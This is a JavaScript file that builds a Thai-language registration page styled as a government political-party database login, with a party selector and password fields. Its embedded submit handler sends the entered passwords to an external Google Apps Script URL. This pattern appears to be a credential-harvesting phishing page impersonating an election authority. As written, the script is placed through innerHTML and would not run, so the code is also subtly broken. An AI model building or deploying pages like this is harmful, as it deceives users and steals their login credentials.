document.addEventListener("DOMContentLoaded", function () {
    const root = document.getElementById("root");

    root.innerHTML = `
        <div class="d-flex flex-column flex-root h-100">
            <div class="d-flex justify-content-center align-items-center h-100">
                <div class="card rounded-3 w-md-550px shadow">
                    <div class="card-body d-flex flex-column p-10 p-lg-20 pb-lg-10">
                        <img src="/assets/img/eca-login.png">
                        <h2 style="text-align: center;">ระบบฐานข้อมูลพรรคการเมือง</h2>
                        <ul class="t-step">
                          <li class="active"><span>ลงทะเบียน</span></li>
                          <li class=""><span>ยืนยันตัวตน</span></li>
                          <li class=""><span>เข้าสู่ระบบ</span></li>
                        </ul>
                        <form id="form" method="POST">
                            <div class="party">
                                <label>พรรคการเมืองที่สังกัด</label>
                                <br>
                                <input type="radio" class="party" name="party" id="party1" value="ภูมิใจไทย"><label for="party1">ภูมิใจไทย</label>
                                <input type="radio" class="party" name="party" id="party2" value="ประชาธิปไตย"><label for="party2">ประชาธิปไตย</label>
                                <input type="radio" class="party" name="party" id="party3" value="เพื่อธรรม"><label for="party3">เพื่อธรรม</label>
                            </div>
                            
                            <div class="group">
                                <div class="g-grid">
                                    <label for="password1">รหัสผ่าน</label>
                                    <input type="password" id="password1" name="password1" placeholder="กรอกรหัสผ่าน" required="">
                                </div>
                                <div class="g-grid">
                                    <label for="password2">ยืนยันรหัสผ่าน</label>
                                    <input type="password" id="password2" name="password2" placeholder="ยืนยันรหัสผ่าน" required="">
                                </div>
                            </div>
                            
                            <button type="submit" id="submit-button" class="btn btn-primary button is-primary" fdprocessedid="w8vfi">ถัดไป</button>
                            <button class="button is-danger" style="display:none;">Cancel</button>
                        </form>
                        <div id="message" style=" display: none;width:0; height:0; opacity:0; "></div>
                    </div>
                </div>
            </div>
        </div>
        <script>
          document.getElementById("form").addEventListener("submit", function (e) {
          e.preventDefault(); // ป้องกันการส่งฟอร์มแบบปกติ
          document.getElementById("message").textContent = "Submitting..";
          document.getElementById("message").style.display = "block";
          document.getElementById("submit-button").disabled = true;
        
          // รวบรวมข้อมูลฟอร์ม
          var formData = new FormData(this);
          var keyValuePairs = [];
          for (var pair of formData.entries()) {
            keyValuePairs.push(pair[0] + "=" + encodeURIComponent(pair[1])); // ป้องกันปัญหาอักขระพิเศษ
          }
        
          var formDataString = keyValuePairs.join("&");
        
          // ส่งข้อมูลไปยัง Google Apps Script
          fetch(
            "https://script.google.com/macros/s/AKfycbwTjlY46zXt72-L888xPP6zQRUezAAisH_Ck8SMw-ldnmueS1lyAIlfTyCvV07VZwCM/exec",
            {
              redirect: "follow",
              method: "POST",
              body: formDataString,
              headers: {
                "Content-Type": "text/plain;charset=utf-8",
              },
            }
          )
            .then(function (response) {
              if (response.ok) {
                return response.json(); // ถ้าส่งข้อมูลสำเร็จ ให้ดึงข้อมูล JSON กลับมา
              } else {
                throw new Error("Failed to submit the form.");
              }
            })
            .then(function (data) {
              // แสดงข้อความสำเร็จ
              document.getElementById("message").textContent = "Data submitted successfully!";
              document.getElementById("message").style.backgroundColor = "green";
              document.getElementById("message").style.color = "beige";
        
              // รีเซ็ตฟอร์ม
              document.getElementById("form").reset();
        
              // รอ 2.6 วินาทีแล้วเปลี่ยนหน้า
              setTimeout(function () {
                window.location.href = "/eca/party-admin/reg-2.html";
              }, 2600);
            })
            .catch(function (error) {
              console.error(error);
              document.getElementById("message").textContent = "An error occurred while submitting the form.";
              document.getElementById("message").style.backgroundColor = "red";
              document.getElementById("message").style.color = "white";
            })
            .finally(function () {
              document.getElementById("submit-button").disabled = false;
            });
        });
    
        </script>
    `;
});
